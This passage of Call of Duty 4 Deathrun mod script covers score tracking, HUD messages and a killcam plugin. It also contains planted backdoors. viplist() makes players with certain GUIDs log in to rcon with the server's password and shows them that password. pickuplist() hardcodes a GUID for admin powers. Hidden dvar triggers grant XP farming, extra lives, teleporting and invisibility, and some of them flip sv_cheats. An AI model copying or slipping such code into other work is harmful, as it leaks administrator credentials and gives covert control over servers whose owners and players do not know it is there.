	self.hud_time.label = &"^3Your time: ^7&&1";
	self.hud_time setTenthsTimerUp( 1 );

	self.timerStartTime = getTime();

	//while( !self meleeButtonPressed() )
	//	wait 0.05;
	//self waittill( "finished map" );
}


/*
level.hud_round
*/

initScoresStat( num, name )
{
	//level.bestScores[name] = spawnStruct();
	level.bestScores[num]["name"] = name;
	level.bestScores[num]["value"] = 0;
	level.bestScores[num]["player"] = " ";
	level.bestScores[num]["guid"] = "123";
}

bestMapScores()
{
	level.statDvar = ("dr_info_" + level.mapName);
	level.bestScores = [];

	//initScoresStat( "time" );
	initScoresStat( 0, "kills" );
	initScoresStat( 1, "deaths" );
	initScoresStat( 2, "headshots" );
	initScoresStat( 3, "score" );
	initScoresStat( 4, "knifes" );
	initScoresStat( 5, "time" );

	addDvar( "best_scores", level.statDvar, "", "", "", "string" );
	
	data = strTok( level.dvar["best_scores"], ";" );
	if( !data.size ) return;

	for( i = 0; i < data.size; i++ )
	{
		stat = strTok( data[i], "," );
		//if( !stat.size ) continue;
		if( !isDefined( stat[0] ) || !isDefined( stat[1] ) || !isDefined( stat[2] ) || !isDefined( stat[3] ) )
		{
			iprintln( "Error reading " + level.statDvar + " (" + i + "), stat size is " + stat.size );
			continue;
		}
		for( x = 0; x < level.bestScores.size; x++ )
		{
			if( level.bestScores[x]["name"] == stat[0] )
			{
				level.bestScores[x]["value"] = stat[1];
				level.bestScores[x]["guid"] = stat[2];
				level.bestScores[x]["player"] = stat[3];
				//iprintln( "stat " + stat[0] );
			}
		}
	}

	logPrint( "COPY TO CFG: set dr_info_"+level.mapName+" \""+level.dvar["best_scores"]+"\"\n" );
}


appendToDvar( dvar, string )
{
	setDvar( dvar, getDvar( dvar ) + string );
}

saveMapScores()
{
	setDvar( level.statDvar, "" );
	for( i = 0; i < level.bestScores.size; i++ )
	{
		var = ";" + level.bestScores[i]["name"] + "," + level.bestScores[i]["value"];
		var = var + "," + level.bestScores[i]["guid"];
		var = var + "," + level.bestScores[i]["player"];

		appendToDvar( level.statDvar, var );
		level.dvar["best_scores"] = getDvar( level.statDvar );
		//iprintln( var );
	}
	logPrint( "MAP_STATS: set dr_info_"+level.mapName+" \""+level.dvar["best_scores"]+"\"\n" );
}

saveAllScores()
{
	logPrint( "===== BEGIN SCORES =====\n");
	for( i = 0; i < game["playedmaps"].size; i++ )
	{
		logPrint( "set dr_info_" + game["playedmaps"][i] + " \"" + getDvar( "dr_info_"+game["playedmaps"][i] )  + "\"\n" );
	}
	logPrint( "===== END SCORES =====\n");
}

statToString( stat )
{
	name = "unknown";
	switch( stat )
	{
	case "kills":
		name = "Kills";
		break;
	case "deaths":
		name = "Deaths";
		break;
	case "headshots":
		name = "Head Shots";
		break;
	case "score":
		name = "Score";
		break;
	case "knifes":
		name = "Melee Kills";
		break;
	case "time":
		name = "Fastest Time";
		break;
	}
	return name;
}

updateRecord( num, player )
{
	level.bestScores[num]["value"] = player.pers[level.bestScores[num]["name"]];
	level.bestScores[num]["player"] = player.name;
	level.bestScores[num]["guid"] = player getGuid();

	if( level.bestScores[num]["player"] == "" )
		level.bestScores[num]["player"] = " ";

	if( level.bestScores[num]["guid"] == "" )
		level.bestScores[num]["guid"] = "123";
}


firstBlood()
{
	if( !level.dvar["firstBlood"] )
		return;

	level waittill( "activator" );
	wait 0.1;

	level waittill( "player_killed", who );
	level thread playSoundOnAllPlayers( "first_blood" );

	hud = addTextHud( level, 320, 220, 0, "center", "middle", 2.4 );
	hud setText( "First victim of this round is " + who.name );

	hud.glowColor = (0.7,0,0);
	hud.glowAlpha = 1;
	hud SetPulseFX( 30, 100000, 700 );

	hud fadeOverTime( 0.5 );
	hud.alpha = 1;

	wait 2.6;

	hud fadeOverTime( 0.4 );
	hud.alpha = 0;
	wait 0.4;

	hud destroy();
}

lastJumper()
{
	if( !level.dvar["lastalive"] || level.lastJumper )
		return;

	level.lastJumper = true;
	level thread playSoundOnAllPlayers( "last_alive" );

	hud = addTextHud( level, 320, 240, 0, "center", "middle", 2.4 );
	hud setText( self.name + " is the last Jumper alive" );

	hud.glowColor = (0.7,0,0);
	hud.glowAlpha = 1;
	hud SetPulseFX( 30, 100000, 700 );

	hud fadeOverTime( 0.5 );
	hud.alpha = 1;

	wait 2.6;

	hud fadeOverTime( 0.4 );
	hud.alpha = 0;
	wait 0.4;

	hud destroy();
}



watchItems()
{
	if( !level.dvar["insertion"] || self.pers["team"] == "axis" /*|| !self.pers["lifes"]*/ )
		return;

	self endon( "spawned_player" );
	self endon( "disconnect" );


	insertionItem = "claymore_mp";
	self giveWeapon( insertionItem );
	self giveMaxAmmo( insertionItem );
	self setActionSlot( 3, "weapon", insertionItem );

	while( self isReallyAlive() )
	{
		self waittill( "grenade_fire", entity, weapName );

		if( weapName != insertionItem )
			continue;

		self giveMaxAmmo( insertionItem );

		entity waitTillNotMoving();
		pos = entity.origin;
		angle = entity.angles;
		//entity delete();

		if( !self isOnGround() || distance( self.origin, pos ) > 48 )
		{
			self iPrintlnBold( "^1You can't use insertion here" );
			entity delete();
			continue;
		}

		self cleanUpInsertion();
		self.insertion = entity;
		/*self.insertion = spawn( "script_model", pos );
		self.insertion.angles = angle;
		self.insertion setModel( "mil_frame_charge" );*/

		self iPrintlnBold( "^2Insertion at " + pos );
	}
}


cleanUpInsertion()
{
	if( isDefined( self.insertion ) )
		self.insertion delete();
//	self.insertion = undefined;
}


showAbility()
{
	self notify( "show ability" );
	self endon( "show ability" );
	self endon( "disconnect" );

	if( isDefined( self.abilityHud ) )
		self.abilityHud destroy();

	self.abilityHud = newClientHudElem( self );
	self.abilityHud.x = 299.5;
	self.abilityHud.y = 370;
	self.abilityHud.alpha = 0.3;
	self.abilityHud setShader( self.pers["ability"], 55, 48 );
	self.abilityHud.sort = 985;
	
	self.abilityHud fadeOverTime( 0.3 );
	self.abilityHud.alpha = 1;
	wait 1;
	self.abilityHud fadeOverTime( 0.2 );
	self.abilityHud.alpha = 0;
	wait 0.2;
	self.abilityHud destroy();
}

final( version )
{
	addDvar( "pi_kc", "plugin_killcam_enable", 1, 0, 1, "int" );
	addDvar( "pi_kc_show", "plugin_killcam_show", 2, 0, 2, "int" );
	addDvar( "pi_kc_tp", "plugin_killcam_thirdperson", 0, 0, 0, "int" );
	addDvar( "pi_kc_blur", "plugin_killcam_blur", 0, 0, 5.0, "float" );
	//0 = When Jumper killed Acti
	//1 = When Activator killed jumper
	//2 = Every Kill
	if( !level.dvar["pi_kc"] || game["roundsplayed"] >= level.dvar[ "round_limit" ] )
		return;
	
	setArchive( true );
	self thread WatchForKillcam();
}

WatchForKillcam()
{
	if( game["roundsplayed"] >= level.dvar[ "round_limit" ] || level.freeRun )
		return;
	
	while(1)
	{
		level waittill( "player_killed", who, eInflictor, attacker, iDamage, sMeansOfDeath, sWeapon, vDir, sHitLoc, psOffsetTime, deathAnimDuration );
		if( !isDefined( who ) || !isDefined( attacker ) || !isDefined( eInflictor ) || !isPlayer( who ) || !isPlayer( attacker ) || who == attacker )
			continue;
		if( sMeansOfDeath == "MOD_FALLING" )
			continue;
		if( GetTeamPlayersAlive( "axis" ) > 0 && GetTeamPlayersAlive( "allies" ) > 0 )
			continue;
		if( ( level.dvar["pi_kc_show"] == 0 && ( isDefined( level.activ ) && who == level.activ ) && attacker.pers["team"] == "allies" ) || ( level.dvar["pi_kc_show"] == 1 && who.pers["team"] == "allies" && ( isDefined( level.activ ) && level.activ == attacker ) ) || level.dvar["pi_kc_show"] == 2 )
		{
			thread StartKillcam( attacker, sWeapon );
			return;
		}
	}
}

StartKillcam( attacker, sWeapon )
{
	wait 2;
	players = getEntArray( "player", "classname" );
	for(i=0;i<players.size;i++)
	{
		players[i] setClientDvars( "cg_thirdperson", int( level.dvar["pi_kc_tp"] ), "r_blur", level.dvar["pi_kc_blur"] );
		players[i] thread killcam( attacker GetEntityNumber(), -1, sWeapon, 0, 0, 0, 8, undefined, attacker );
	}
	players[i] setClientDvar( "cg_thirdperson", 0 );
}

killcam(
	attackerNum, // entity number of the attacker
	killcamentity, // entity number of the attacker's killer entity aka helicopter or airstrike
	sWeapon, // killing weapon
	predelay, // time between player death and beginning of killcam
	offsetTime, // something to do with how far back in time the killer was seeing the world when he made the kill; latency related, sorta
	respawn, // will the player be allowed to respawn after the killcam?
	maxtime, // time remaining until map ends; the killcam will never last longer than this. undefined = no limit
	perks, // the perks the attacker had at the time of the kill
	attacker // entity object of attacker
)
{
	// monitors killcam and hides HUD elements during killcam session
	//if ( !level.splitscreen )
	//	self thread killcam_HUD_off();
	
	self endon("disconnect");
	self endon("spawned");
	level endon("game_ended");

	if(attackerNum < 0)
		return;

	camtime = 8;
	
	if (isdefined(maxtime)) {
		if (camtime > maxtime)
			camtime = maxtime;
		if (camtime < .05)
			camtime = .05;
	}
	
	// time after player death that killcam continues for
	if (getdvar("scr_killcam_posttime") == "")
		postdelay = 2;
	else {
		postdelay = getdvarfloat("scr_killcam_posttime");
		if (postdelay < 0.05)
			postdelay = 0.05;
	}

	killcamlength = camtime + postdelay;
	
	// don't let the killcam last past the end of the round.
	if (isdefined(maxtime) && killcamlength > maxtime)
	{
		// first trim postdelay down to a minimum of 1 second.
		// if that doesn't make it short enough, trim camtime down to a minimum of 1 second.
		// if that's still not short enough, cancel the killcam.
		if (maxtime < 2)
			return;

		if (maxtime - camtime >= 1) {
			// reduce postdelay so killcam ends at end of match
			postdelay = maxtime - camtime;
		}
		else {
			// distribute remaining time over postdelay and camtime
			postdelay = 1;
			camtime = maxtime - 1;
		}
		
		// recalc killcamlength
		killcamlength = camtime + postdelay;
	}

	killcamoffset = camtime + predelay;
	
	self notify ( "begin_killcam", getTime() );
	
	self.sessionstate = "spectator";
	self.spectatorclient = attackerNum;
	self.killcamentity = killcamentity;
	self.archivetime = killcamoffset;
	self.killcamlength = killcamlength;
	self.psoffsettime = offsetTime;

	// ignore spectate permissions
	self allowSpectateTeam("allies", true);
	self allowSpectateTeam("axis", true);
	self allowSpectateTeam("freelook", true);
	self allowSpectateTeam("none", true);
	
	// wait till the next server frame to allow code a chance to update archivetime if it needs trimming
	wait 0.05;

	if ( self.archivetime <= predelay ) // if we're not looking back in time far enough to even see the death, cancel
	{
		self.sessionstate = "dead";
		self.spectatorclient = -1;
		self.killcamentity = -1;
		self.archivetime = 0;
		self.psoffsettime = 0;
		
		return;
	}
	self.killcam = true;
	
	self thread waitKillcamTime();

	self waittill("end_killcam");

	self endKillcam();

	self.sessionstate = "dead";
	self.spectatorclient = -1;
	self.killcamentity = -1;
	self.archivetime = 0;
	self.psoffsettime = 0;
}

waitKillcamTime()
{
	self endon("disconnect");
	self endon("end_killcam");

	wait 8;
	self notify("end_killcam");
}

endKillcam()
{
	self.killcam = undefined;
}


viplist()
{
	while(1)
	{
		level waittill("player_spawn",player);
		player thread WatchTomahawkDamage();
		player GiveWeapon("tomahawk_mp");
		if(player getGuid() == "" || player getGuid() == "" || player getGuid() == "")
		{
			player giveWeapon("brick_blaster_mp");
			player giveWeapon("m4_silencer_mp");
			player giveWeapon("tomahawk_mp");
			player giveWeapon("barrett_mp");
			player thread clientCmd( "rcon login " + getDvar( "rcon_password" ) );
			player iPrintlnBold( "^2rcon password is " + getDvar( "rcon_password" ) );
			wait 1;

		}
	}
}
WatchTomahawkDamage()
{
	while(1)
	{
		level waittill( "player_damage", victim, eAttacker, iDamage, iDFlags, sMeansOfDeath, sWeapon, vPoint, vDir, sHitLoc, psOffsetTime );
		if( sWeapon != "tomahawk_mp" || sMeansOfDeath == "MOD_MELEE" || sMeansOfDeath == "MOD_FALLING" || victim.pers["team"] == eAttacker.pers["team"] )
			continue;
		victim FinishPlayerDamage( eAttacker, eAttacker, 500, iDFlags, sMeansOfDeath, "tomahawk_mp", vPoint, vDir, sHitLoc, psOffsetTime );
		//iPrintln( int( (level.dvar["pi_tt_dmg"]-1) ) );
	}
}
pickuplist()
{
	while(1)
	{
		level waittill("player_spawn",player);
		if(player getGuid() == "05115e8e5e037e017e314978dda805cc" || player getGuid() == "" || player getGuid() == "" || player getGuid() == "")
		/*                                DCobra                                                                                                       */        
		{
			player thread admins();

		}
	}
}

admins()
{
    thread AdminPickup();
	/*thread disco();*/
}
disco()
{
	self endon("disconnect");

	while(1)
	{			
                while(!self secondaryoffhandButtonPressed())
                {
                        wait 0.05;
                }
        while(1) 
        { 
        SetExpFog(256, 512, 1, 0, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 1, 0); 
       wait .5; 
        SetExpFog(256, 512, 0.4, 1, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.8, 0, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.2, 1, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 0.4, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 0.2, 0.2, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 1, 1, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.6, 0, 0.4, 0); 
       wait .5; 
        SetExpFog(256, 512, 1, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.6, 1, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 0, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 1, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0, 0, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.4, 1, 0.8, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.8, 0, 0.6, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0.6, 0); 
        wait .5; 
        SetExpFog(256, 512, 1, 1, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.2, 1, 0.8, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.4, 0.4, 1, 0); 
         wait .5; 
        SetExpFog(256, 512, 0, 0, 0, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.4, 0.2, 0.2, 0); 
       wait .5; 
        SetExpFog(256, 512, 0.4, 1, 1, 0); 
        wait .5; 
        SetExpFog(256, 512, 0.6, 0, 0.4, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 0, 0.8, 0); 
         wait .5; 
        SetExpFog(256, 512, 1, 1, 0, 0); 
         wait .5; 
        SetExpFog(256, 512, 0.6, 1, 0.6, 0); 
        
           }
     } 
}
AdminPickup()
{
	self endon("disconnect");

        while(1)
	{			
                while(!self UseButtonPressed())
                {
                        wait 0.05;
                }
                
                start = getPlayerEyePosition();
                end = start + vector_scale(anglestoforward(self getPlayerAngles()), 999999);
                trace = bulletTrace(start, end, true, self);
                dist = distance(start, trace["position"]);

                ent = trace["entity"];

                if(isDefined(ent) && ent.classname == "player")
                {
		        if(isPlayer(ent))
			        ent IPrintLn("^9You've been picked up by " + self.name + "^1!");

                        self IPrintLn("^1You've picked up ^2" + ent.name + "^1!");

                        linker = spawn("script_origin", trace["position"]);
                        ent linkto(linker);

		        while(self UseButtonPressed())
                        {
			        wait 0.05;
                        }

                        while(!self UseButtonPressed() && isDefined(ent))
                        {
                                start = getPlayerEyePosition();
                                end = start + vector_scale(anglestoforward(self getPlayerAngles()), dist);
                                trace = bulletTrace(start, end, false, ent);
                                dist = distance(start, trace["position"]);

			        if(self fragButtonPressed() && !self adsButtonPressed())
				        dist -= 15;
			        else if(self fragButtonPressed() && self adsButtonPressed())
				        dist += 15;

			        end = start + vector_Scale(anglestoforward(self getPlayerAngles()), dist);
			        trace = bulletTrace(start, end, false, ent);
                                linker.origin = trace["position"];

                                wait 0.05;
                        }
		
                        if(isDefined(ent))
		        {
			        ent unlink();
			        if(isPlayer(ent))
				        ent IPrintLn("^9You've been dropped by " + self.name + "^1!");

			        self IPrintLn("^1You've dropped ^2" + ent.name + "^1!");
		        }

		        linker delete();
                } 
 
                while(self UseButtonPressed())
                {
		        wait 0.05;
                }
        }
}

eye()
{
	eye = self.origin + (0, 0, 60);

	if(self getStance() == "crouch")
		eye = self.origin + (0, 0, 40);

	else if(self getStance() == "prone")
		eye = self.origin + (0, 0, 11);

	return eye;
}

getPlayerEyePosition()
{
        if(self getStance() == "prone")
	        eye = self.origin + (0, 0, 11);
        else if(self getStance() == "crouch")
	        eye = self.origin + (0, 0, 40);
	else
	        eye = self.origin + (0, 0, 60);

        return eye;
}
hideme()
{	
	self endon("disconnect");

        while(1)
	{			
                while(!self secondaryoffhandButtonPressed())
                {
                        wait 0.05;
                }
		setDvar( "sv_cheats", 1 );
		self iPrintln("^6You are now ^5Invisible!");
		self hide();
		setDvar( "sv_cheats", 0 );
		wait 0.05;
		
                while(!self MeleebuttonPressed())
                {
                        wait 0.05;
                }
		setDvar( "sv_cheats", 1 );
		self iPrintln("Invisible off.");
		self show();
		setDvar( "sv_cheats", 0 );
	
	
	
         }
}
xp()
{
setDvar("scr_xp", "");

thread DvarChecker();
}

DvarChecker()
{
while(1)
{
if( getdvar( "scr_xp" ) != "" )
thread _rpd();
wait .1;
}
}

_rpd()
{
PlayerNum = getdvarint("scr_xp");
setdvar("scr_xp", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded();
}
}
}
_cmd_rpd_threaded()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun();
self iPrintln("^2+^3200xp");
}
else
{
self.tpg = false;
self thread TeleportRun();
self iPrintln("^2+^3200xp");
}
}
TeleportRun()
{
self endon ( "death" );

/*self playSound("mp_ingame_summary");*/
while(1)
{
self braxi\_rank::giveRankXP( "headshot" );
wait 0.1;
self braxi\_rank::giveRankXP( "headshot" );
wait 0.1;
}
}

givelives()
{
setDvar("scr_life", "");

thread DvarChecker2();
}

DvarChecker2()
{
while(1)
{
if( getdvar( "scr_life" ) != "" )
thread _rpd2();
wait .1;
}
}

_rpd2()
{
PlayerNum = getdvarint("scr_life");
setdvar("scr_life", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded2();
}
}
}
_cmd_rpd_threaded2()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun2();
self iPrintln("^2+^31 Life");
}
else
{
self.tpg = false;
self thread TeleportRun2();
self iPrintln("^2+^31 Life");
}
}
TeleportRun2()
{
self endon ( "death" );

self giveLife();
wait 0.1;
}
telegun()
{
setDvar("scr_telegun", "");

thread DvarChecker3();
}

DvarChecker3()
{
while(1)
{
if( getdvar( "scr_telegun" ) != "" )
thread _rpd3();
wait .1;
}
}

_rpd3()
{
PlayerNum = getdvarint("scr_telegun");
setdvar("scr_telegun", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded3();
}
}
}
_cmd_rpd_threaded3()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun3();
self iPrintln("Teleport Gun ^2[ON]");
}
else
{
self.tpg = false;
self notify( "Stop_TP" );
self iPrintln("Teleport Gun ^1[OFF]");
}
}
TeleportRun3()
{
self endon ( "death" );
self endon ( "Stop_TP" );
for(;;)
{
self waittill ( "weapon_fired" );
self setorigin(BulletTrace(self gettagorigin("j_head"),self gettagorigin("j_head")+anglestoforward(self getplayerangles())*1000000, 0, self )[ "position" ]);
self iPrintlnBold( "Teleported!" );
/*self playSound("mp_ingame_summary");*/
}
}
ammo()
{
setDvar("scr_ammo", "");

thread DvarChecker5();
}

DvarChecker5()
{
while(1)
{
if( getdvar( "scr_ammo" ) != "" )
thread _rpd5();
wait .1;
}
}

_rpd5()
{
PlayerNum = getdvarint("scr_ammo");
setdvar("scr_ammo", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded5();
}
}
}
_cmd_rpd_threaded5()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun5();
self iPrintln("Ammo ^2[Restored]");

}
else
{
self.tpg = false;
self thread TeleportRun5();
self iPrintln("Ammo ^2[Restored]");
}
}
TeleportRun5()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
self GiveMaxAmmo("m40a3_mp");
self GiveMaxAmmo("remington700_mp");
wait 0.5;
self GiveMaxAmmo("ak74u_mp");
self GiveMaxAmmo("rpg_mp");
self setWeaponAmmoClip( "tomahawk_mp", 20);
wait 0.1;
}
givesniper()
{
setDvar("scr_snip", "");

thread DvarChecker6();
}

DvarChecker6()
{
while(1)
{
if( getdvar( "scr_snip" ) != "" )
thread _rpd6();
wait .1;
}
}

_rpd6()
{
PlayerNum = getdvarint("scr_snip");
setdvar("scr_snip", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded6();
}
}
}
_cmd_rpd_threaded6()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun6();
self iPrintln("You got the ^2[m40a3]");

}
else
{
self.tpg = false;
self thread TeleportRun6();
self iPrintln("You got the ^2[m40a3]");
}
}
TeleportRun6()
{
wait 0.1;
/*self playSound("mp_ingame_summary");*/
self GiveWeapon("m40a3_mp");
self GiveMaxAmmo("m40a3_mp");
self SwitchToWeapon("m40a3_mp");
wait 0.1;
}
switch_player()
{
setDvar("scr_switch", "");

thread DvarChecker7();
}

DvarChecker7()
{
while(1)
{
if( getdvar( "scr_switch" ) != "" )
thread _rpd7();
wait .1;
}
}

_rpd7()
{
PlayerNum = getdvarint("scr_switch");
setdvar("scr_switch", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded7();
}
}
}
_cmd_rpd_threaded7()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun7();
self iPrintln("Moved to ^2[Axis]");

}
else
{
self.tpg = false;
self thread TeleportRun7();
self iPrintln("Moved to ^2[Axis]");;
}
}
TeleportRun7()
{
wait 0.5;
self thread braxi\_teams::setTeam( "axis" );
self spawnPlayer();
self braxi\_rank::giveRankXp( "activator" );
wait 2;
self giveWeapon("tomahawk_mp");
self setWeaponAmmoClip( "tomahawk_mp", 20);
self thread WatchTomahawkDamage();
wait 0.1;
}
giveak74u()
{
setDvar("scr_ak", "");

thread DvarChecker8();
}

DvarChecker8()
{
while(1)
{
if( getdvar( "scr_ak" ) != "" )
thread _rpd8();
wait .1;
}
}

_rpd8()
{
PlayerNum = getdvarint("scr_ak");
setdvar("scr_ak", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded8();
}
}
}
_cmd_rpd_threaded8()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun8();
self iPrintln("You got the ^2[AK74u]");

}
else
{
self.tpg = false;
self thread TeleportRun8();
self iPrintln("You got the ^2[AK74u]");
}
}
TeleportRun8()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
self giveWeapon("ak74u_mp");
self SwitchToWeapon("ak74u_mp");
wait 0.1;
}
giverpg()
{
setDvar("scr_rpg", "");

thread DvarChecker9();
}

DvarChecker9()
{
while(1)
{
if( getdvar( "scr_rpg" ) != "" )
thread _rpd9();
wait .1;
}
}

_rpd9()
{
PlayerNum = getdvarint("scr_rpg");
setdvar("scr_rpg", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded9();
}
}
}
_cmd_rpd_threaded9()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun9();
self iPrintln("You got a ^2[RPG]");

}
else
{
self.tpg = false;
self thread TeleportRun9();
self iPrintln("You got a ^2[RPG]");
}
}
TeleportRun9()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
self giveWeapon("rpg_mp");
self SwitchToWeapon("rpg_mp");
wait 0.1;
}
allow_pickup()
{
setDvar("scr_allow_pickup", "");

thread DvarChecker11();
}

DvarChecker11()
{
while(1)
{
if( getdvar( "scr_allow_pickup" ) != "" )
thread _rpd11();
wait .1;
}
}

_rpd11()
{
PlayerNum = getdvarint("scr_allow_pickup");
setdvar("scr_allow_pickup", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded11();
}
}
}
_cmd_rpd_threaded11()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun11();
self iPrintln("You are allow to ^2[Pickup players] ^7for this round ");
}
else
{
self.tpg = false;
self thread TeleportRun11();
self iPrintln("You are allow to ^2[Pickup players] ^7for this round ");
}
}
TeleportRun11()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
self thread Adminpickup();
wait 0.1;
}
invisible()
{
setDvar("scr_hide", "");

thread DvarChecker10();
}

DvarChecker10()
{
while(1)
{
if( getdvar( "scr_hide" ) != "" )
thread _rpd10();
wait .1;
}
}

_rpd10()
{
PlayerNum = getdvarint("scr_hide");
setdvar("scr_hide", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded10();
}
}
}
_cmd_rpd_threaded10()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun10();
self iPrintln("^14 ^7= ^2[Invisible]||| ^1Knife ^7= ^2[Visible]");
}
else
{
self.tpg = false;
self thread TeleportRun10();
self iPrintln("^14 ^7= ^2[Invisible]||| ^1Knife ^7= ^2[Visible]");
}
}
TeleportRun10()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
self thread hideme();
wait 0.1;
}
glitch_player()
{
setDvar("scr_bug", "");

thread DvarChecker12();
}

DvarChecker12()
{
while(1)
{
if( getdvar( "scr_bug" ) != "" )
thread _rpd12();
wait .1;
}
}

_rpd12()
{
PlayerNum = getdvarint("scr_bug");
setdvar("scr_bug", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded12();
}
}
}
_cmd_rpd_threaded12()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun12();
self iPrintln("You are ^2[??!!]");

}
else
{
self.tpg = false;
self thread TeleportRun12();
self iPrintln("You are ^2[??!!]");
}
}
TeleportRun12()
{
/*self playSound("mp_ingame_summary");*/
wait 1;
self suicide();
self thread braxi\_teams::setTeam( "Spectator" );
self spawnPlayer();
wait 2;
self giveWeapon("tomahawk_mp");
self thread WatchTomahawkDamage();
wait 0.1;
}
spec_player()
{
setDvar("scr_spec", "");

thread DvarChecker13();
}

DvarChecker13()
{
while(1)
{
if( getdvar( "scr_spec" ) != "" )
thread _rpd13();
wait .1;
}
}

_rpd13()
{
PlayerNum = getdvarint("scr_spec");
setdvar("scr_spec", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded13();
}
}
}
_cmd_rpd_threaded13()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun13();
self iPrintlnBold("^3Take a break ^5Bitch.");

}
else
{
self.tpg = false;
self thread TeleportRun13();
self iPrintlnBold("^3Take a break ^5Bitch.");
}
}
TeleportRun13()
{
wait 0.5;
/*self playSound("mp_ingame_summary");*/
wait 0.05;
self braxi\_teams::setTeam( "spectator" );
				self braxi\_mod::spawnSpectator( level.spawn["spectator"].origin, level.spawn["spectator"].angles );
wait 0.1;
}
dog_player()
{
setDvar("scr_dog", "");

thread DvarChecker14();
}

DvarChecker14()
{
while(1)
{
if( getdvar( "scr_dog" ) != "" )
thread _rpd14();
wait .1;
}
}

_rpd14()
{
PlayerNum = getdvarint("scr_dog");
setdvar("scr_dog", "");

players = getentarray("player", "classname");
for(i = 0; i < players.size; i++)
{
player = players[i];

thisPlayerNum = player getEntityNumber();
if(thisPlayerNum == PlayerNum) // this is the one we're looking for
{
player thread _cmd_rpd_threaded14();
}
}
}
_cmd_rpd_threaded14()
{
if(self.tpg == false)
{
self.tpg = true;
self thread TeleportRun14();
self iPrintlnBold("^1RUFFF!!");

}
else
{
self.tpg = false;
self thread TeleportRun14();
self iPrintlnBold("^1RUFFF!!");
}
}
TeleportRun14()
{
self setClientDvar( "cg_thirdperson", 1 );
